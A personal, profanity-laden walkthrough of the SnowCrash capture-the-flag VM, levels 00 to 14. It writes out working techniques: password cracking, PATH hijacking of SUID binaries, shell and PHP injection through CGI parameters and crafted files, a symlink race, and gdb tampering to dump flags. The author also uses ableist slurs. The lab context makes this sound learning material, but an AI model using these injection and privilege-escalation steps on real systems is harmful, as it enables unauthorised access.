# snowcrash, why am I doing this to myself
This is supposed to be some introductory project to cybersecurity.
#### random shit I found
```
level00@SnowCrash:~$ users
level00 level00
```
there are no fucking files, don't know where the fuck to start this retarded shit
```
level00@SnowCrash:~$ps -U level00
  PID TTY          TIME CMD
 1935 tty1     00:00:00 bash
 2194 ?        00:00:00 sshd
 2195 pts/0    00:00:00 bash
 2314 pts/0    00:00:00 ps
```
*no weird processes noted by this fucking stupid user*
```
level00@SnowCrash:~$find / -user level00 -type f 2> /dev/null
```
*what the fuck, endless fucking files, kill me*
So I was looking for the wrong user, apparently flag00 is a fucking user
```
find / -group flag00 2>/dev/null
```
## file found for flag00, /usr/sbin/john
containing
```
cdiiddwpgswtgt
```
looks like a cypher, but which one, kill me

using this baby **https://www.boxentriq.com/code-breaking/cipher-identifier**
detected **Bifid Cipher**, tried decyphering, nothing, fucking retarded detector

### trying Caesar Cipher cuz it's the second recommend
outputs: nottoohardhere
```
level00@SnowCrash:~$ su flag00
Password: 
Don't forget to launch getflag !
flag00@SnowCrash:~$ getflag
Check flag.Here is your token : x24ti5gi3x0ol2eh4esiuxias
```
## level01
Of course this bullshit is empty again
### stupid blind enumeration commands
```
env
```
*show all env variables, nothing fucking interesting*
```
sudo -l
```
*display all sudo info for current user, asks for the fucking password, kill me*
```
find / -perm /6000 2>/dev/null;
```
*shows all SUID and SGID files, nothing interesting to note*
```
cat /etc/shadow
```
*perm denied*
```
cat /etc/passwd
```
*listing users in the system*
Shows user flag01
```
flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
```
fucking kill me, need to crack the passwd file, googled of course, **John the Ripper**, and yay, can't use it on the retarded Snowcrash machine

**tried to fucking use docker but the fucking retarded mac is fucking retarded, KILL ME**
Using google cloud, john installed, need to send the passwd file
```
scp -P 4242 level01@10.12.100.115:/etc/passwd .
```
Nothing connection timed out, kill me, copied the passwd file, download wordlist from **https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Software/john-the-ripper.txt**
```
~$ /usr/sbin/john --wordlist=wordlist.txt passwd
$ /usr/sbin/john --show passwd 
flag01:abcdefg:3001:3001::/home/flag/flag01:/bin/bash
1 password hash cracked, 0 left
```
*tada*
```
su flag01
Password:abcdefg
Don't forget to launch getflag !
flag01@SnowCrash:~$ getflag
Check flag.Here is your token : f2av5il02puano7naaf6adaaf
flag01@SnowCrash:~$ su level02
Password:f2av5il02puano7naaf6adaaf
```
## level02
#### tshark, I think?
```
scp -P 4242 level02@10.12.100.115:/home/user/level02/level02.pcap .
```
Using tshark to open capture file, found
```
0000   00 24 1d 0f 00 ad 08 00 27 cc 8a 1e 08 00 45 00   .$......'.....E.
0010   00 41 d4 b3 40 00 40 06 16 77 3b e9 eb df 3b e9   .A..@.@..w;...;.
0020   eb da 2f 59 99 4f ba a8 fb 18 9d 18 15 7b 80 18   ../Y.O.......{..
0030   01 c5 27 9d 00 00 01 01 08 0a 02 c2 3c 62 01 1b   ..'.........<b..
0040   b9 87 00 0d 0a 50 61 73 73 77 6f 72 64 3a 20      .....Password: 
```
*at No 43*

reading the following lines` Data :
```
66 74 5f 77 61 6e 64 72 7f 7f 7f 4e 44 52 65 6c 7f 4c
```
Using hex to ascii, **ft_wandrNDRelL**, authentication failure, I guess i have missed the last hex
```
66 74 5f 77 61 6e 64 72 7f 7f 7f 4e 44 52 65 6c 7f 4c 30 4c
```
**ft_wandrNDRelL0L**
```
su flag02
Password: ft_wandrNDRelL0L
Don't forget to launch getflag !
flag02@SnowCrash:~$ getflag
Check flag.Here is your token : kooda2puivaav1idi4f57q8iq
flag02@SnowCrash:~$ su level03
Password:kooda2puivaav1idi4f57q8iq
```
## level03
#### exploitme
```
level03@SnowCrash:~$ ls -al
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
```
*executable has SUID permission, **When you execute a program that has the SUID bit enabled, you inherit the permissions of that program's owner***

Using **binary ninja**
```
mov     dword [esp], data_80485e0  {"/usr/bin/env echo Exploit me"}
```
*create symbolic link of echo that runs getflag, of course permission denied, so i used /tmp*
```
level03@SnowCrash:~$ln -s /bin/getflag /tmp/echo
level03@SnowCrash:~$ export PATH=.:$PATH
level03@SnowCrash:/tmp$ ./level03
Check flag.Here is your token : 
Nope there is no token here for you sorry. Try again :)
```
*Fucking kill me*
#### I'm a fucking idiot retard, PATH should be PATH=/tmp:$PATH
```
level03@SnowCrash:~$ export PATH=/tmp:$PATH
level03@SnowCrash:~$ ./level03 
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
level03@SnowCrash:~$ su level04
Password:qi0maab88jeaj46qoumi7maus
```
## level04, fucking perl
Executing it doesn't print shit, tried editing after copying file to /tmp, file has SUID permission

After googling *GCI*, **In Perl, CGI(Common Gateway Interface) is a protocol for executing scripts via web requests.**
```
$curl http://10.12.100.115:4747/\?x\=blah
blah
```
*using the x param, curl prints whatever is passed to it in x=*
```
curl http://10.12.100.115:4747/\?x\=$\(getflag\)
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
level04@SnowCrash:~$ su level05
Password:ne2searoevaevoem4ov4ar8ap
```
## Attempt to reverse /bin/getflag, because I need to do Minirt 
Using **binary ninja**
```
mov     dword [esp {var_130}], data_8048fa8  {"You should not reverse this"} 
```
*fuck you, i do what I waant fucking fascist*

The binary calls getuid, the returned UID is in eax
```
call  getuid
```
*GETUID returns the real user ID of the calling process*
#### trying to override uid
```
(gdb) b getuid
Breakpoint 2 at 0xb7ee4cc0
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /bin/getflag 

Breakpoint 1, 0x0804894a in main ()
(gdb) c
Continuing.
You should not reverse this
```
*debugging is blocked by ptrace()*
```
call    ptrace
```
Hijacking te ptrace() function using LD_PRELOAD
*created file /tmp/ptrace.c*
```
long ptrace(int request, int pid, int addr, int data)
{
     return 0;
}
```
*created fake library
```
level05@SnowCrash:/tmp$ gcc /tmp/ptrace.c -o /tmp/ptrace.so -fPIC -shared -ldl -D_GNU_SOURCE
level05@SnowCrash:/tmp$ export LD_PRELOAD=/tmp/ptrace.so
```
gdb
```
b getuid
Breakpoint 1 at 0x80484b0
(gdb) r
Starting program: /bin/getflag 
Injection Linked lib detected exit..
During startup program exited with code 1.
```
*Bad fucking idea*
#### disassemble main
Executable calls an ft_dec and then fputs, I suspect it's the lines that print the flag
```
0x08048c01 <+699>:   call   0x8048604 <ft_des>
0x08048c06 <+704>:   mov    %ebx,0x4(%esp)
0x08048c0a <+708>:   mov    %eax,(%esp)
0x08048c0d <+711>:   call   0x8048530 <fputs@plt>
```
break in main then in **jns     0x80489a8** which is at addr **0x08048990**, because jumping straight to the address after the puts segfaults
```
(gdb) b main 
Breakpoint 1 at 0x804894a
(gdb) b *0x08048990
Breakpoint 2 at 0x8048990
(gdb) r
Starting program: /bin/getflag 

Breakpoint 1, 0x0804894a in main ()
(gdb) c
Continuing.

Breakpoint 2, 0x08048990 in main ()
```
try first jumping to the first address after return from fputs
```
(gdb) jump *0x08048c17
Continuing at 0x8048c17.
f2av5il02puano7naaf6adaaf
[Inferior 1 (process 2345) exited normally]
```
*this is the level02 password*
```
(gdb) jump *0x08048c3b
Continuing at 0x8048c3b.
kooda2puivaav1idi4f57q8iq
[Inferior 1 (process 2365) exited normally]
```
*flag for level03*
```
(gdb) jump *0x08048c5f
Continuing at 0x8048c5f.
qi0maab88jeaj46qoumi7maus
[Inferior 1 (process 2374) exited normally]
```
*level04*
```
(gdb) jump *0x08048c83
Continuing at 0x8048c83.
ne2searoevaevoem4ov4ar8ap
[Inferior 1 (process 2375) exited normally]
```
*level05*
```
(gdb) jump *0x08048ca7
Continuing at 0x8048ca7.
viuaaale9huek52boumoomioc
[Inferior 1 (process 2382) exited normally]
```
**all I wanted was this flaaaag for level06**
```
(gdb) jump *0x08048ccb
Continuing at 0x8048ccb.
wiok45aaoguiboiki2tuin6ub
[Inferior 1 (process 2519) exited normally]
```
*level07*
```
(gdb) jump *0x08048cef
Continuing at 0x8048cef.
fiumuikeil55xe9cu4dood66h
[Inferior 1 (process 2526) exited normally]
```
*level08*
```
(gdb) jump *0x08048d13
Continuing at 0x8048d13.
25749xKZ8L7DkSCwJkT9dyv6f
[Inferior 1 (process 2527) exited normally]
```
*level09*
```
(gdb) jump *0x08048d37
Continuing at 0x8048d37.
s5cAJpM8ev6XHw998pRWG728z
[Inferior 1 (process 2631) exited normally]
```
*level10*
```
(gdb) jump *0x08048d5b
Continuing at 0x8048d5b.
feulo4b72j7edeahuete3no7c
[Inferior 1 (process 2638) exited normally]
```
*level11*
```
(gdb) jump *0x08048d7f
Continuing at 0x8048d7f.
fa6v5ateaw21peobuub8ipe6s
[Inferior 1 (process 2639) exited normally]
```
*level12*
```
(gdb) jump *0x08048da3
Continuing at 0x8048da3.
g1qKMiRpXf53AWhDaU7FEkczr
[Inferior 1 (process 2656) exited normally]
```
*level13*
```
(gdb) jump *0x08048dc4
Continuing at 0x8048dc4.
2A31L79asukciNyi8uppkEuSx
[Inferior 1 (process 2721) exited normally]
```
*level14*

## RE level05, been told you SHOULDN'T REVERSE /bin/getflag, who the fuck comes up with these rules
Again fucking empty working directory
```
level05@SnowCrash:~$ find / -user flag05 2>/dev/null
```
*stupid directories and files I dgaf*
```
level05@SnowCrash:~$ find / -user flag05 2>/dev/null
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver
```
the first is a file containing a script
```
level05@SnowCrash:~$ ls -l /usr/sbin/openarenaserver
-rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver
```
*no special permissions mo SUID, guess I'll die*
```
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver 
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```
Second is a file as well can't open it
```
level05@SnowCrash:~$ ls -l /rofs/usr/sbin/openarenaserver
-rwxr-x--- 1 flag05 flag05 94 Mar  5  2016 /rofs/usr/sbin/openarenaserver
level05@SnowCrash:~$ cat /rofs/usr/sbin/openarenaserver
cat: /rofs/usr/sbin/openarenaserver: Permission denied
```
### the stupid script
loops on files in **/opt/openarenaserver/**, sets ulimit to 5 and executes them then deletes files

*ulimit -t 5: this shit sets a timer of 5 seconds on allowed time to execute process, if time is 'dépassé', dk what the word is, then process is terminated or killed*

*bash -x: executes .sh files*

After many attempts to create a file a.sh in /opt/openarenaserver/ containing the **getflag**, and executing the script, token still empty, and file is deleted, I guess **because the script is executed with the user's permissions, and not the owner's, nothing special happens, It's the same as executing getflag myself from the terminal**

*However, this challenge can't be this fucking retarded, to give a script with no fucking special permissions how the fuck am I supposed to do anything with it.*

```
level05@SnowCrash:~$ps -ef
```
*attempt to see if a process with higher permissions could execute this in the background, nothing*

#### little experiment
Created a file inside /opt/openarenaserver/, empty file, and waited to see if it will be deleted

After a while **IT DID**, so recreated file a.sh with getflag inside and redirected the getflag output to  file in /tmp, just to save output before files get deleted
```
level05@SnowCrash:~$ touch /opt/openarenaserver/a.sh
level05@SnowCrash:~$ echo "getflag > /tmp/a" > /opt/openarenaserver/a.sh
level05@SnowCrash:~$ cd /opt/openarenaserver/
level05@SnowCrash:/opt/openarenaserver$ ls
level05@SnowCrash:/opt/openarenaserver$ ls
level05@SnowCrash:/opt/openarenaserver$ cat /tmp/a
Check flag.Here is your token : viuaaale9huek52boumoomioc
```
*after a while file was deleted, and there's the flaaaaaag*
```
level05@SnowCrash:/opt/openarenaserver$ su level06
Password:viuaaale9huek52boumoomioc
```
*I'm still depressed*
## level06 a.k.a I swear I'm gonna get kicked out
directory is not empty but **PHP**??! fuck php, wtf, kill me
```
level06@SnowCrash:~$ cat level06.php 
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
```
*are you shitting me, reg expressions en plus*

Executable accepts two arguments, $argv[1] and $argv[2], first is definetly a file name since there's a **file_get_contents($y)** I guess I dk php, then a fucking **preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);**, what the fuck

*Why is there both an executable and the script, like we can't fucking execute with php, disgusting*

When attempting to compile this shit online, with strings instead of file names just to see what the fuck that preg_replace does, an error/warning is displayed
```
Warning: preg_replace(): The /e modifier is no longer supported, use preg_replace_callback instead
```
*googled this shit*: **First of all, the very concept of this modifier was always evil. It included an eval case into source-code, the existence of which was usually overlooked and therefore quite easily exploited.**

Nice, so if the input matches the regex, it is further evaluated as php code, I dk if that's what the guy meant, but I don't care enough to try more

**/(\[x (.*)\])/e** this is the stupid regex, I guess starts with "[x (" and whatever in the middle and ")]" at the end ?
```
level06@SnowCrash:~$ echo  "[x (whatever)]" > /tmp/khra
level06@SnowCrash:~$ ./level06 /tmp/khra
(whatever)
```
*nice the () are not included of course, I'm stupid, now how the fuck do I inject the stupid **getflag***
```
level06@SnowCrash:~$ echo  "[x getflag]" > /tmp/khra
level06@SnowCrash:~$ ./level06 /tmp/khra
getflag
level06@SnowCrash:~$ echo  "[x $getflag]" > /tmp/khra
level06@SnowCrash:~$ ./level06 /tmp/khra

level06@SnowCrash:~$ echo  "[x ${`getflag`}]" > /tmp/khra
bash: [x ${`getflag`}]: bad substitution
level06@SnowCrash:~$ echo  "[x `getflag`]" > /tmp/khra
level06@SnowCrash:~$ echo  "[x ${`getflag`}]" > /tmp/khra
bash: [x ${`getflag`}]: bad substitution
level06@SnowCrash:~$ echo  '[x ${`getflag`}]' > /tmp/khra
level06@SnowCrash:~$ ./level06 /tmp/khra
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1
```
*omg fuck php*
```
level06@SnowCrash:~$ su level07
Password:wiok45aaoguiboiki2tuin6ub
```
## level07
Executable prints level07
```
level07@SnowCrash:~$ file level07 
level07: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x26457afa9b557139fa4fd3039236d1bf541611d0, not stripped
```
**strings level07** shows a line with **/bin/echo %s**
```
level07@SnowCrash:~$ ls -l level07 
-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
```
*SUID yay*, **binary ninja**, ouh it actually displays the content of an env variable *LOGNAME*
```
mov     dword [esp], data_8048680  {"LOGNAME"}
call    getenv
```
*displayed using /bin/echo and calling the system() function*
```
level07@SnowCrash:~$ LOGNAME=`getflag`
level07@SnowCrash:~$ ./level07 
Check flag.Here is your token :
sh: 2: Syntax error: ")" unexpected
```
*I'm stupid and lazy*
```
level07@SnowCrash:~$ LOGNAME='`getflag`'
level07@SnowCrash:~$ ./level07 
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
level07@SnowCrash:~$ su level08
Password:fiumuikeil55xe9cu4dood66h
```
*yay, stupid shell*
## level10
```
level10@SnowCrash:~$ ./level10 token [host_ip]
You don't have access to token
```
and on my host machine
```
➜  snowcrash git:(master) ✗ nc -l 6969
```
*sending /bin/ls as the first arg prints the content of binary /bin/ls client side, fucking useless*

**binary ninja**, the executable calls function **access** that returns 0 if we can access file and -1 otherwise

#### trying to override eax since it's the register containing the return of access
using **(gdb) set $eax=0**

Well that was a fucking stupid idea, nothing happened 

Executable checks access if 0 then connects to socket then sends content of file?

### stupid idea, not mine, spamming symbolic link to token by making a loop that creates one switches it and deletes it etc
*fucking kill me for fuck's sake, how the fuck is this even a fucking idea*

I guess printing the retarded message right before the file content is not random
```
.*( )*.
```
*this fucking bullshit is for slowing down connection to socket, so need to exploit that*
```
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
woupa2yuojeeaaed06riuj63c
```
*kill me*
```
level10@SnowCrash:~$ su flag10
Password: 
Don't forget to launch getflag !
flag10@SnowCrash:~$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
```
## level11
*fucking lua, of course*
```
level11@SnowCrash:~$ ls -al level11.lua 
-rwsr-sr-x 1 flag11 level11 668 Mar  5  2016 level11.lua
```
*nice*

I noticed in previous challenges in output of ps -ef a process running this script
```
flag11    1807     1  0 19:30 ?        00:00:00 lua /home/user/level11/level11.lua
```
script binds socket to 127.0.0.1 port 5151, I dgaf, kill me 
```
level11@SnowCrash:~$ nc 127.0.0.1 5151
Password: `getflag`
Erf nope..
```
*of course it's a stupid idea*

script hashed input and does useless shit to it and no matter the input, will display either **"Erf nope..\n"** or **"Gz you dumb\n"**, so what's the point in being alive
```
prog = io.popen("echo "..pass.." | sha1sum", "r")
```
*that looks suspicious, an **echo**, but that message doesnt even get displayed
```
Password: level11@SnowCrash:~$ nc 127.0.0.1 5151
Password: `getflag > /tmp/a`
Erf nope..
level11@SnowCrash:~$ cat /tmp/a
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
level11@SnowCrash:~$ su level12
Password:fa6v5ateaw21peobuub8ipe6s
```
*oups, fucking retard*
## level12, fucking perl again?????
And **CGI** again
```
@output = `egrep "^$xx" /tmp/xd 2>&1`;
```
*this is the only thing that looks suspicious or exploitable, rest looks useless*

script takes **n(t(param("x"), param("y")));** first param x and **$xx =~ tr/a-z/A-Z/;** uppercases the shit out of it, then **$xx =~ s/\s.\*//;** fucking substitutes /*/ or I dont even know what the fuck that is
**Oh fuck I googles, apparently apter capitalizing the argument, it deletes whats after a space, Im a fucking joke**
### Im so fucking lost
so I need to create a script with an uppercase name cuz fucking stupid fucking Linux
```
level12@SnowCrash:~$ touch /tmp/A
level12@SnowCrash:~$ echo "getflag > /tmp/a" > /tmp/A
```
then
```
➜  snowcrash git:(master) ✗ curl '10.11.100.157:4646?x=`/*/A`'
..%                                                                                                                                      
➜  snowcrash git:(master) ✗ curl '10.11.100.157:4646?x=`"/*/A`"'
.%
```
and
```
level12@SnowCrash:~$ cat /tmp/a
cat: /tmp/a: No such file or directory
```
*fucking kill meeeee*

So **($f, $s) = split(/:/, $line);** this shit splits the file name, also the fuck only prints **..** or **.**, are there logs for this stupid shit, kill me
```
evel12@SnowCrash:~$ find / -user flag12 2>/dev/null
/var/www/level12
/var/www/level12/level12.pl
/rofs/var/www/level12
/rofs/var/www/level12/level12.pl
```
I guess this is apache2, googles log files for apache2, **/var/log/apache/access.log**
```
level12@SnowCrash:~$ ls  /var/log/apache/access.log
ls: cannot access /var/log/apache/access.log: No such file or directory
level12@SnowCrash:~$ ls  /var/log
apache2  apt  auth.log  boot.log  casper.log  dmesg  dmesg.0  kern.log  mail.err  mail.log  news  syslog  udev  ufw.log
level12@SnowCrash:~$ ls  /var/log/apache2/
access.log  error.log  other_vhosts_access.log  suexec.log
level12@SnowCrash:~$ cat /var/log/apache2/error.log
[Thu Nov 26 10:05:56 2020] [notice] suEXEC mechanism enabled (wrapper: /usr/lib/apache2/suexec)
[Thu Nov 26 10:05:56 2020] [notice] Apache/2.2.22 (Ubuntu) PHP/5.3.10-1ubuntu3.19 with Suhosin-Patch configured -- resuming normal operations
[Thu Nov 26 11:50:05 2020] [error] [client 10.11.4.10] sh: 1: 
[Thu Nov 26 11:50:05 2020] [error] [client 10.11.4.10] /tmp/A: Permission denied
[Thu Nov 26 11:50:05 2020] [error] [client 10.11.4.10] 
[Thu Nov 26 11:50:25 2020] [error] [client 10.11.4.10] sh: 1: 
[Thu Nov 26 11:50:25 2020] [error] [client 10.11.4.10] Syntax error: Unterminated quoted string
[Thu Nov 26 11:50:25 2020] [error] [client 10.11.4.10] 
[Thu Nov 26 11:54:39 2020] [error] [client 10.11.4.10] sh: 1: 
[Thu Nov 26 11:54:39 2020] [error] [client 10.11.4.10] /tmp/A: Permission denied
[Thu Nov 26 11:54:39 2020] [error] [client 10.11.4.10] 
[Thu Nov 26 11:54:51 2020] [error] [client 10.11.4.10] sh: 1: 
[Thu Nov 26 11:54:51 2020] [error] [client 10.11.4.10] /tmp/A: Permission denied
[Thu Nov 26 11:54:51 2020] [error] [client 10.11.4.10]
```
*so it's apache2, my bad*

/tmp/A: Permission denied, fucking kill me, whyyyyy.

### tried AGAIN
```
level12@SnowCrash:/tmp$ touch G
level12@SnowCrash:/tmp$ echo '/bin/getflag > /tmp/g' > G
level12@SnowCrash:/tmp$ touch /tmp/g

➜  snowcrash git:(master) ✗ curl '10.11.100.157:4646?x=`/*/G`'
..%

level12@SnowCrash:/tmp$ cat /tmp/g
level12@SnowCrash:/tmp$ rm *cat /var/log/apache2/error.log
.
.
[Thu Nov 26 12:15:27 2020] [error] [client 10.11.4.10] /tmp/G: Permission denied
```
**NOOOOOO**

Oh shit,  does it need the x permission to execute it, omg am I this retarded
```
level12@SnowCrash:/tmp$ chmod +x G

➜  snowcrash git:(master) ✗ curl '10.11.100.157:4646?x=`/*/G`'
..% 

level12@SnowCrash:/tmp$ cat /tmp/g
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
level12@SnowCrash:/tmp$ su level13
Password:g1qKMiRpXf53AWhDaU7FEkczr
```
*okay I am that fucking retarded*
## level13
```
level13@SnowCrash:~$ ls -l level13 
-rwsr-sr-x 1 flag13 level13 7303 Aug 30  2015 level13
level13@SnowCrash:~$ ./level13 
UID 2013 started us but we we expect 4242
```
*kill me whyyyyyyy am I always below expectations*
```
➜  snowcrash git:(master) ✗ scp -P 4242 level13@10.11.100.157:/home/user/level13/level13 .
```
**binary ninja**, calls getuid then compares it with **0x1092 which is 4242**, then blah blah dc
```
call    getuid
cmp     eax, 0x1092 
```
### where the fuck does getuid() get the UID
```
level13@SnowCrash:~$ echo $UID
2013
level13@SnowCrash:~$ ./level13 
UID 2013 started us but we we expect 4242
level13@SnowCrash:~$ UID=4242
bash: UID: readonly variable
```
*oh why do i always think I'm so fucking smart*

**fucking gdb will fucking help**

```
level13@SnowCrash:~$ gdb ./level13
(gdb) b main
Breakpoint 1 at 0x804858f
(gdb) b getuid
Breakpoint 2 at 0x8048380
(gdb) r
Starting program: /home/user/level13/level13 

Breakpoint 1, 0x0804858f in main ()
(gdb) c
Continuing.

Breakpoint 2, 0xb7ee4cc0 in getuid () from /lib/i386-linux-gnu/libc.so.6
```
After disassembling main, **0x0804859a** is the address in which the cmp occurs, so I wil set EAX to **0x1092** tada
```
(gdb) s
Single stepping until exit from function getuid,
which has no line number information.
0x0804859a in main ()
(gdb) set $eax=0x1092
(gdb) s
Single stepping until exit from function main,
which has no line number information.
your token is 2A31L79asukciNyi8uppkEuSx
```
*TADA, bitch*
```
level13@SnowCrash:~$ su level14
Password:2A31L79asukciNyi8uppkEuSx
```
## level14
NO fucking files for fuck's sake, again